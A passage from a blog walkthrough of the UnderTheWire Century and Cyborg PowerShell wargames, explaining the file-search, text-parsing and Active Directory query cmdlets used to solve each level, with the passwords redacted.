PowerShell we get the following.\nWe can try using the syntax provided to us to see if it will work.\nPS C:\\users\\century3\\desktop\u0026gt; (get-childitem C:\\Users\\century3\\Desktop -File | Measure-object).count [REDACTED] PS C:\\users\\century3\\desktop\u0026gt; The command works, below is the breakdown of how we used the command to our scenario.\nget-childitem C:\\Users\\century3\\Desktop\nThis command retrieves all items in the desktop directory for user century3.\n-File\nThis parameter filters the results to include only files, excluding directories if there are more directories within the directory we are in.\n| Measure-Object\nThis pipes the output to the Measure-Object cmdlet, which calculates various statistics, including the count.\n.Count\nThis accesses the count property of Measure-Object output, giving us the total number of files.\nCentury level 4-5 # Below is the objective for this level.\nThe password for Century5 is the name of the file within a directory on the desktop that has spaces in its name. NOTE: – The password will be lowercase no matter how it appears on the screen. We are required to find a way to access directories that have spaces within them in PowerShell.\nThis one is easy as we can use the cd command and enclose the directory with spaces in double quotes to be able to access it.\nPS C:\\users\\century4\\desktop\u0026gt; cd \u0026#34;.\\Can You Open Me\u0026#34; PS C:\\users\\century4\\desktop\\Can You Open Me\u0026gt; ls Directory: C:\\users\\century4\\desktop\\Can You Open Me Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/27/2025 7:57 PM 24 [REDACTED] PS C:\\users\\century4\\desktop\\Can You Open Me\u0026gt; As seen above, in windows directories are accessed by using the backslash \\ but in linux they are referenced using forward slash / but in windows we can also access the directory without including the .\\ as this suggest change directory to the new directory within this same directory, in this case it is a subdirectory.\nPS C:\\users\\century4\\desktop\u0026gt; cd \u0026#34;Can You Open Me\u0026#34; PS C:\\users\\century4\\desktop\\Can You Open Me\u0026gt; ls Directory: C:\\users\\century4\\desktop\\Can You Open Me Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/27/2025 7:57 PM 24 [REDACTED] PS C:\\users\\century4\\desktop\\Can You Open Me\u0026gt; Century level 5-6 # As described in the challenge description, as seen below.\nThe password for Century6 is the short name of the domain in which this system resides in PLUS the name of the file on the desktop. NOTE: – If the short name of the domain is “blob” and the file on the desktop is named “1234”, the password would be “blob1234”. – The password will be lowercase no matter how it appears on the screen. We are required to find the domain name in which the system resides in. In linux, domain names are usually stored in the etc/host file where they are mapped to the IP address on which the domain name is linked to via dns in order for us to access it on our machine.\nIn our case, we need to find a way of reading the host file on windows which is usually stored in\nC:\\Windows\\System32\\drivers\\etc. As seen below, is the output of the content in the host file\nPS C:\\Windows\\System32\\drivers\\etc\u0026gt; type .\\hosts # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name . # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 192.99.167.156 games.underthewire.tech From the output above the domain is underthewire as it the only uncommented line which means it can be accessed. No we need to go back to the desktop directory of the user century5 and find the file in the directory for us to get our password for century6 as from the description the password is domain file without space between.\nPS C:\\Users\\century5\\Desktop\u0026gt; ls Directory: C:\\Users\\century5\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 3:29 AM 54 [REDACTED] PS C:\\Users\\century5\\Desktop\u0026gt; Century level 6-7 # For this challenge, we are required to know the number of folders on the desktop to get the password for level 7.\nThe password for Century7 is the number of folders on the desktop This challenge is similar to the challenge on level 3, but we will use the parameter for directory(similar to folder)for this case.\nPS C:\\users\\century6\\desktop\u0026gt; (get-childitem C:\\users\\century6\\desktop -Directory | measure-object).count [REDACTED] PS C:\\users\\century6\\desktop\u0026gt; Century level 7-8 # For this challenge we are required to search for a file named readme to get the password for level 8.\nThe password for Century8 is in a readme file somewhere within the contacts, desktop, documents, downloads, favorites, music, or videos folder in the user’s profile. NOTE: – The password will be lowercase no matter how it appears on the screen The trick here is to find a way to search for a file in multiple directories recursively, in Linux the find command does the magic, we could search the equivalent of this command as a cmdlet in PowerShell.\nAs seen above, the cmdlet equivalent of the find command is Get-ChildItem\nPS C:\\users\\century7\u0026gt; get-childitem -Recurse -File -Filter readme* Directory: C:\\users\\century7\\[REDACTED] Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 3:29 AM 7 Readme.txt PS C:\\users\\century7\u0026gt; Below is a breakdown of the command.\nget-childitem\nThis command retrieves all content in the current directory. Without specification of the directory in which the command is specified to retrieve content from, the command assumes the current directory.\n-Recurse\nThis parameter specifies to retrieve content recursively.\n-File\nThis parameter specifies to search for files only\n-Filter\nThis parameter specifies the files to be retrieved should begin with the word readme then followed by anything after it readme*\nWith that, we can go to the directory where our file is located and read the contents of the files using the type cmdlet as shown below.\nPS C:\\users\\century7\\[REDACTED]\u0026gt; type \u0026#34;.\\Readme.txt\u0026#34; [REDACTED] PS C:\\users\\century7\\[REDACTED]\u0026gt; Century level 8-9 # We are required to count the number of unique entries in the file currently in the desktop directory of the user century8.\nThe password for Century9 is the number of unique entries within the file on the desktop. For this case we can use the type cmdlet then pipe the output to Measure-object and then access the count property of Measure-Object to get the number of unique entries as shown below.\nPS C:\\users\\century8\\desktop\u0026gt; (type \u0026#34;.\\unique.txt\u0026#34; | measure-object).count [REDACTED] PS C:\\users\\century8\\desktop\u0026gt; Century level 9-10 # For this challenge, we are required to find the 161st word in the file on the desktop which is the password for level 10.\nThe password for Century10 is the 161st word within the file on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. Below is the command I used\n((Get-Content Word_File.txt -Raw) -split \u0026#39;\\s+\u0026#39;)[160] Here is the breakdown\nGet-Content Word_File.txt -Raw Reads the whole file as one string.\n-split '\\s+' splits by white space, that is spaces, tabs, newlines\n[160] gets the 161st word as arrays start from 0, hence the 161st word will be on array 160\nCentury level 10-11 # Below is the description and objective of the challenge.\nThe password for Century11 is the 10th and 8th word of the Windows Update service description combined PLUS the name of the file on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. – If the 10th and 8th word of the service description is “apple” and “juice” and the name of the file on the desktop is “88”, the password would be “applejuice88”. We are required to find the 10th and 8th word on the Windows update service description and then combine it with the name of the file in the desktop to find the password for level 11.\nFirst we shall output the information about the Windows update service in a well-formatted table using the command below.\nGet-Service wuauserv | Select-Object -Property * | ft -AutoSize Get-Service wuauserv\nRetrieves the Windows Update service (its service name is wuauserv). This gives you basic info: Status, Name, and DisplayName. | Select-Object -Property *\nPasses the service object to Select-Object. Property * selects all properties of the object, not just the default. | ft -AutoSize\nft is short for Format-Table. AutoSize adjusts the column widths to fit the content nicely. After that, we then get the actual description using the command below.\n$(Get-WmiObject win32_Service -Filter \u0026#34;DisplayName = \u0026#39;Windows Update\u0026#39;\u0026#34; | Select-Object -Property Description).Description Get-WmiObject Win32_Service -Filter \u0026quot;DisplayName = 'Windows Update'”\nRetrieves the Windows Update service using WMI, filtering by its display name. | Select-Object -Property Description\nSelects just the Description property from the result. .Description\nExtracts the actual description text from the selected object. Below is the output from the command.\nPS C:\\users\\century10\\desktop\u0026gt; $(Get-WmiObject win32_Service -Filter \u0026#34;DisplayName = \u0026#39;Windows Update\u0026#39;\u0026#34; | Select-Object -Property Description).Description Enables the detection, download, and installation of updates for Window s and other programs. If this service is disabled, users of this comput er will not be able to use Windows Update or its automatic updating fea ture, and programs will not be able to use the Windows Update Agent (WU A) API. We will store the output of the above command in a variable, me I called it $text as shown below.\n$text = $(Get-WmiObject win32_Service -Filter \u0026#34;DisplayName = \u0026#39;Windows Update\u0026#39;\u0026#34; | Select-Object -Property Description).Description We shall then use a PowerShell command to concatenate the 10th and 8th word plus the file name in the current directory using the command below.\n$($($text.split(\u0026#34; \u0026#34;))[9] + $($text.split(\u0026#34; \u0026#34;))[7] + $((ls).name)).ToLower() $text.split(\u0026quot; \u0026quot;) Splits the string stored in $text (assumed to be the service description) into an array of words using space as the delimiter. $($text.split(\u0026quot; \u0026quot;))[9] Retrieves the 10th word (index 9, since PowerShell is 0-based). $($text.split(\u0026quot; \u0026quot;))[7] Retrieves the 8th word (index 7). (ls).name Gets the name of items in the current directory using ls (alias for Get-ChildItem). If there\u0026rsquo;s only one file (e.g., 110), this will return that file\u0026rsquo;s name (without extension if it\u0026rsquo;s a folder, or with extension if it\u0026rsquo;s a file). $((ls).name) Wraps the above so it works in string concatenation. Below is the output of the above command.\n$($($text.split(\u0026#34; \u0026#34;))[9] + $($text.split(\u0026#34; \u0026#34;))[7] + $((ls).name)) [REDACTED] PS C:\\users\\century10\\desktop\u0026gt; Century level 11-12 # Below is the description for the challenge, however, it similar to the challenge in level 7 but this time we are required to search for a hidden file.\nThe password for Century12 is the name of the hidden file within the contacts, desktop, documents, downloads, favorites, music, or videos folder in the user’s profile. NOTE: – Exclude “desktop.ini”. – The password will be lowercase no matter how it appears on the screen. For this challenge, we shall use the ls command as shown below.\nls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.ini\u0026#39; } ls ..\\ -Recurse -Hidden -File: Lists all hidden files recursively in the parent directory. Where-Object { $_.Name -ne 'desktop.ini' }: Filters out any file where the name is exactly desktop.ini. Below is the output of the command\nPS C:\\users\\century11\\desktop\u0026gt; ls ..\\ -Recurse -Hidden -File | Where-Ob ject { $_.Name -ne \u0026#39;desktop.ini\u0026#39; } Directory: C:\\users\\century11 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-h-- 1/23/2025 4:28 PM 262144 NTUSER.DAT -a-hs- 8/30/2018 3:11 AM 98304 ntuser.dat.LOG1 -a-hs- 8/30/2018 3:11 AM 126976 ntuser.dat.LOG2 -a-hs- 7/12/2020 10:55 PM 65536 NTUSER.DAT{0f893ee4-7 8e5-11e6-90dd-eefb078 25ed9}.TM.blf -a-hs- 6/14/2020 4:36 AM 524288 NTUSER.DAT{0f893ee4-7 8e5-11e6-90dd-eefb078 25ed9}.TMContainer000 00000000000000001.reg trans-ms -a-hs- 7/12/2020 10:55 PM 524288 NTUSER.DAT{0f893ee4-7 8e5-11e6-90dd-eefb078 25ed9}.TMContainer000 00000000000000002.reg trans-ms ---hs- 8/30/2018 3:11 AM 20 ntuser.ini ls : Access to the path \u0026#39;C:\\users\\century11\\AppData\\Local\\Application Data\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\centur...pp lication Data:String) [Get-ChildItem], UnauthorizedAccessExceptio n + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\AppData\\Local\\History\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\A ppData\\Local\\History:String) [Get-ChildItem], UnauthorizedAccessE xception + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand Directory: C:\\users\\century11\\AppData\\Local\\Microsoft\\Windows Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-h-- 8/30/2018 3:11 AM 8192 UsrClass.dat -a-hs- 8/30/2018 3:11 AM 8192 UsrClass.dat.LOG1 -a-hs- 8/30/2018 3:11 AM 8192 UsrClass.dat.LOG2 -a-hs- 8/30/2018 3:11 AM 65536 UsrClass.dat{d82669b3 -abff-11e8-90ee-e14c2 6db97e8}.TM.blf -a-hs- 8/30/2018 3:11 AM 524288 UsrClass.dat{d82669b3 -abff-11e8-90ee-e14c2 6db97e8}.TMContainer0 0000000000000000001.r egtrans-ms -a-hs- 8/30/2018 3:11 AM 524288 UsrClass.dat{d82669b3 -abff-11e8-90ee-e14c2 6db97e8}.TMContainer0 0000000000000000002.r egtrans-ms ls : Access to the path \u0026#39;C:\\users\\century11\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\centur... I nternet Files:String) [Get-ChildItem], UnauthorizedAccessExceptio n + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\AppData\\Local\\Temporary Internet Files\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\centur... I nternet Files:String) [Get-ChildItem], UnauthorizedAccessExceptio n + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\centur...do ws\\Start Menu:String) [Get-ChildItem], UnauthorizedAccessExceptio n + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Application Data\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\A pplication Data:String) [Get-ChildItem], UnauthorizedAccessExcept ion + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Cookies\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\C ookies:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Documents\\My Music\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\D ocuments\\My Music:String) [Get-ChildItem], UnauthorizedAccessExce ption + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Documents\\My Pictures\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\D ocuments\\My Pictures:String) [Get-ChildItem], UnauthorizedAccessE xception + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Documents\\My Videos\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\D ocuments\\My Videos:String) [Get-ChildItem], UnauthorizedAccessExc eption + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand Directory: C:\\users\\century11\\[REDACTED] Mode LastWriteTime Length Name ---- ------------- ------ ---- --rh-- 8/30/2018 3:34 AM 30 secret_sauce ls : Access to the path \u0026#39;C:\\users\\century11\\Local Settings\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\L ocal Settings:String) [Get-ChildItem], UnauthorizedAccessExceptio n + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\My Documents\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\M y Documents:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\NetHood\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\N etHood:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\PrintHood\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\P rintHood:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.Po werShell.Commands.GetChildItemCommand ls : Access to the path \u0026#39;C:\\users\\century11\\Recent\u0026#39; is denied. At line:1 char:1 + ls ..\\ -Recurse -Hidden -File | Where-Object { $_.Name -ne \u0026#39;desktop.i ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\users\\century11\\R ecent:String) [Get-ChildItem], UnauthorizedAccessException From the output above, we can easily find the file which secret_sauce\nCentury level 12-13 # Below is the description for the challenge in this level.\nThe password for Century13 is the description of the computer designated as a Domain Controller within this domain PLUS the name of the file on the desktop. NOTE: – The password will be lowercase no matter how it appears on the screen. – If the description “today_is” and the file on the desktop is named “_cool”, the password would be “today_is_cool”. We are required to find the description of the computer designated as a Domain Controller within this domain.\nBelow is the command I used to get the AD details.\nGet-ADComputer -Filter * -Properties Can onicalName,description The above command retrieves all Active Directory computers along with their CanonicalName and description properties. Below is the output of the command.\nPS C:\\users\\century12\\desktop\u0026gt; Get-ADComputer -Filter * -Properties Can onicalName,description CanonicalName : underthewire.tech/Domain Controllers/UTW Description : [REDACTED] DistinguishedName : CN=UTW,OU=Domain Controllers,DC=underthewire,DC=tech DNSHostName : utw.underthewire.tech Enabled : True Name : UTW ObjectClass : computer ObjectGUID : 5ca56844-bb73-4234-ac85-eed2d0d01a2e SamAccountName : UTW$ SID : S-1-5-21-758131494-606461608-3556270690-1000 UserPrincipalName : CanonicalName : underthewire.tech/Computers/192.99.167.156 Description : DistinguishedName : CN=192.99.167.156,CN=Computers,DC=underthewire,DC= tech DNSHostName : Enabled : True Name : 192.99.167.156 ObjectClass : computer ObjectGUID : d8247090-aa0e-456e-b9b0-a6a55f6469c5 SamAccountName : 192.99.167.156$ SID : S-1-5-21-758131494-606461608-3556270690-2182 UserPrincipalName : With that, we can then list the contents on the desktop of the user and see the file we require to link the name with the description details to get our password.\nCentury level 13-14 # For this challenge, we are required to know the number of words within the file on the desktop.\nThe password for Century14 is the number of words within the file on the desktop. We shall use the below command to get the number of words in the file.\n(ls | gc).split(\u0026#34; \u0026#34;).count Below is the breakdown of the command.\nls lists the contents of the current directory.\n| gc is a short form for Get-Content the out of the command ls is piped to this command in order to use its property of count to get the number of words in the file.\nsplit(\u0026quot; \u0026quot;) this command splits whitespaces within the file.\n.count the property for the command Get-Content that is used to count the number of words in the file.\nCentury level 14-15 # For this challenge, we are required to count the number of times the word polo appears in the file on the desktop.\nThe password for Century15 is the number of times the word “polo” appears within the file on the desktop. NOTE: – You should count the instances of the whole word only.. We shall use the following command.\n$($(gci | gc).split(\u0026#34; \u0026#34;) | ? {$_ -eq \u0026#34;polo\u0026#34;}).count Below is the break-down of the command.\ngci\nThis is short for Get-ChildItem, which lists files and directories in the current directory.\ngci | gc\nThis passes the list of files from gci to gc, which is short for Get-Content.\nSo this reads the content of all files in the current directory.\n.split(\u0026quot; \u0026quot;)\nThis splits all the contents (as a single string) by spaces into individual words.\n| ? {$_ -eq \u0026quot;polo\u0026quot;}\nThis filters the resulting words for ones that are exactly equal to \u0026quot;polo\u0026quot;.\n? is short for Where-Object $_ refers to the current object in the pipeline $(...)\nThis is a sub-expression. It evaluates the command inside and substitutes its result in place.\n$(...).count\nAfter filtering out \u0026quot;polo\u0026quot; from the split words, .count gets the total number of times \u0026quot;polo\u0026quot; appears.\nBelow is the output of the command.\nPS C:\\users\\century14\\desktop\u0026gt; $($(gci | gc).split(\u0026#34; \u0026#34;) | ? {$_ -eq \u0026#34;p olo\u0026#34;}).count [REDACTED] PS C:\\users\\century14\\desktop\u0026gt; Century level 15 # We are done with the challenge on to the next.\nCongratulations! You have successfully made it to the end! Try your luck with other games brought to you by the Under The Wire team. Thanks for playing! Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\users\\century15\\Desktop\u0026gt;ls 😁😄😃 ","date":"10 June 2025","externalUrl":null,"permalink":"/posts/century/","section":"Posts","summary":"underthewire wargames century series","title":"Underthewire century war games","type":"posts"},{"content":" Cyborg level 0-1 # For this challenge, we are required to just log in into the platform with creds from the Slack channel.\nThe goal of this level is to log into the game. Do the following in order to achieve this goal. 1. Obtain the initial credentials via the #StartHere channel on our Slack (link). Once you are in the channel, scroll to the top to see the credentials. 2. After obtaining the credentials, connect to the server via SSH. You will need an SSH client such as Putty. The host that you will be connecting to is cyborg.underthewire.tech, on port 22. 3. When prompted, use the credentials for the applicable game found in the #StartHere Slack channel. 4. You have successfully connected to the game server when your path changes to “PS C:\\Users\\Cyborg1\\desktop\u0026gt;”. Below is a screenshot showing the credentials from the slack channel.\nWith the creds obtained, we can ssh to our instance. Below is a shell to the instance from my computer.\nC:\\Users\\Victo\\Desktop\\underthewire\u0026gt;ssh cyborg1@cyborg.underthewire.tech cyborg1@cyborg.underthewire.tech\u0026#39;s password: Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. Under the Wire... PowerShell Training for the People! PS C:\\users\\cyborg1\\desktop\u0026gt; Cyborg level 1-2 # Below is the description and objectives of the challenge.\nThe password for cyborg2 is the state that the user Chris Rogers is from as stated within Active Directory. NOTE: – The password will be lowercase no matter how it appears on the screen. – “State” refers to the location within the country and NOT the “state” of the account (enabled/ disabled). IMPORTANT: Once you feel you have completed the Cyborg1 challenge, start a new connection to the server, and log in with the username of Cyborg2 and this password will be the answer from Cyborg1. If successful, close out the Cyborg1 connection and begin to solve the Cyborg2 challenge. This concept is repeated over and over until you reach the end of the game. ▼ HINT:List the available modules, there may be a useful one available… As seen above, we are required to know the state in which Chris Rogers is from in order to find our password.\nWe shall use the following commands.\nGet-ADUser -Filter * -Properties State | Where-Object { $_.surname -eq \u0026#34;Rogers\u0026#34; } | ft Name, State Below is a breakdown of what the commands above do.\nGet-ADUser -Filter *\nGets all user objects from Active Directory Filter * means \u0026ldquo;no filter\u0026rdquo; (get all users) Properties State\nBy default, Get-ADUser only returns basic properties This includes the \u0026lsquo;State\u0026rsquo; property in the results (which isn\u0026rsquo;t returned by default) | Where-Object { $_.surname -eq \u0026quot;Rogers\u0026quot; }\nPipes the results to filter for users where the surname equals \u0026ldquo;Rogers\u0026rdquo; $_ represents the current object in the pipeline | ft Name, State\nFormats the output as a table (ft is an alias for Format-Table) Only displays the Name and State columns Below is the output of the command.\nPS C:\\users\\cyborg1\\desktop\u0026gt; Get-ADUser -Filter * -Properties State | W here-Object { $_.surname -eq \u0026#34;Rogers\u0026#34; } | ft Name, State Name State ---- ----- Rogers, Chris [REDACTED] Cyborg level 2-3 # From the objective of this challenge, we are required to find the IP address of host A for CYBORG718W100N and join it with the name of the file on the desktop to get the password for level 3 as stated below.\nThe password for cyborg3 is the host A record IP address for CYBORG718W100N PLUS the name of the file on the desktop. NOTE: – If the IP is “10.10.1.5” and the file on the desktop is called “_address”, then the password is “10.10.1.5_address”. – The password will be lowercase no matter how it appears on the screen. We shall use the following command.\n$($(Resolve-DnsName CYBORG718W100N).IPAddress + $(ls).name) Below is an explanation of what is happening.\n$(Resolve-DnsName CYBORG718W100N).IPAddress\nResolve-DnsName CYBORG718W100N - Performs a DNS lookup for the hostname .IPAddress - Extracts just the IP address from the DNS results Wrapped in $() - This is a subexpression that gets evaluated first $(ls).name\nls - Alias for Get-ChildItem (lists files in current directory) .name - Extracts just the filename(s) from the results Wrapped in $() - Another subexpression evaluated separately The + operator\nConcatenates (combines) the IP address string with the filename string The outer $()\nCombines everything into a single expression that outputs the result Below is the output of the command.\nPS C:\\users\\cyborg2\\desktop\u0026gt; $($(Resolve-DnsName CYBORG718W100N).IPAddress + $(ls).name) [REDACTED] Cyborg level 3-4 # For this level we are required to find the number of users in the cyborg group within active directory and then link it with the name of the file on the desktop.\nThe password for cyborg4 is the number of users in the Cyborg group within Active Directory PLUS the name of the file on the desktop. NOTE: – If the number of users is “20” and the file on the desktop is called “_users”, then the password is “20_users”. – The password will be lowercase no matter how it appears on the screen. Here is the command we shall use to find the number of users in the cyborg group of the active directory.\n(Get-ADGroupMember -Identity Cyborg).Count Below is a breakdown of the commnad.\nGet-ADGroupMember\nA cmdlet from the ActiveDirectory module that retrieves members of an AD group Requires the AD module (typically installed via RSAT tools) Identity Cyborg\nSpecifies which group to examine (in this case, a group named \u0026ldquo;Cyborg\u0026rdquo;) .Count property\nReturns the number of objects in the collection This counts all direct members of the group (not nested group members) Below is the output of the command\nPS C:\\users\\cyborg3\\desktop\u0026gt; (Get-ADGroupMember -Identity Cyborg).Count [REDACTED] PS C:\\users\\cyborg3\\desktop\u0026gt; We can now check the file on the desktop directory using the command ls as shown below.\nPS C:\\users\\cyborg3\\desktop\u0026gt; ls Directory: C:\\users\\cyborg3\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2/26/2022 2:14 PM 0 [REDACTED] PS C:\\users\\cyborg3\\desktop\u0026gt; And with that we have the password for the next level.\nCyborg level 4-5 # For this challenge, we are required to find the module name with the version number of 8.9.8.9 and then link it with the name of the file on the desktop.\nThe password for cyborg5 is the PowerShell module name with a version number of 8.9.8.9 PLUS the name of the file on the desktop. NOTE: – If the module name is “bob” and the file on the desktop is called “_settings”, then the password is “bob_settings”. – The password will be lowercase no matter how it appears on the screen. We shall be using the following command to find the module with the version number.\nGet-Module -ListAvailable | Where-Object { $_.Version -eq \u0026#34;8.9.8.9\u0026#34; } Below is a break-down of the command.\nGet-Module -ListAvailable\nGet-Module - Retrieves PowerShell modules ListAvailable - Shows all modules installed on the system (not just currently imported ones) Without this switch, it would only show currently loaded modules | (Pipeline)\nTakes the output from Get-Module and passes it to the next command Where-Object { $_.Version -eq \u0026quot;8.9.8.9\u0026quot; }\nFilters the modules to find only those with exact version 8.9.8.9 $_ represents each module object as it comes through the pipeline eq performs an exact match comparison Below is the output of the command, followed by the listing command ls to get the file on the desktop directory.\nPS C:\\users\\cyborg4\\desktop\u0026gt; get-module -listavailable | where-object { $_.Ver sion -eq \u0026#34;8.9.8.9\u0026#34;} Directory: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules ModuleType Version Name ExportedComm ands ---------- ------- ---- ------------ Manifest 8.9.8.9 [REDACTED] Get-bacon PS C:\\users\\cyborg4\\desktop\u0026gt; ls Directory: C:\\users\\cyborg4\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/30/2018 10:45 AM 0 _eggs Cyborg level 5-6 # For this level, we are required to find the user who has their logon hours set on their account, with that data, we then use it to link it with the name of the file on the desktop of the user cyborg5 in order to get the password for level 6.\nThe password for cyborg6 is the last name of the user who has logon hours set on their account PLUS the name of the file on the desktop. NOTE: – If the last name is “fields” and the file on the desktop is called “_address”, then the password is “fields_address”. – The password will be lowercase no matter how it appears on the screen. Here is the command I used for this case.\nGet-ADUser -Filter * -Properties logonhour s | Where-Object { ($null -ne $_.logonhours) -and ($null -ne $_.surname ) } Below is the breakdown of the command.\nGet-ADUser -Filter * -Properties logonhours\nRetrieves all Active Directory user accounts (Filter *) Includes the logonhours property (which isn\u0026rsquo;t returned by default) The logonhours property contains the permitted logon hours for each user Where-Object Filter\nThe pipeline filters users to only those who meet both conditions:\n$null -ne $_.logonhours - User has logon hours restrictions configured $null -ne $_.surname - User has a surname (last name) value populated Below is the output of the command.\nPS C:\\users\\cyborg5\\desktop\u0026gt; Get-ADUser -Filter * -Properties logonhour s | Where-Object { ($null -ne $_.logonhours) -and ($null -ne $_.surname ) } DistinguishedName : CN=Rowray\\, Benny \\ 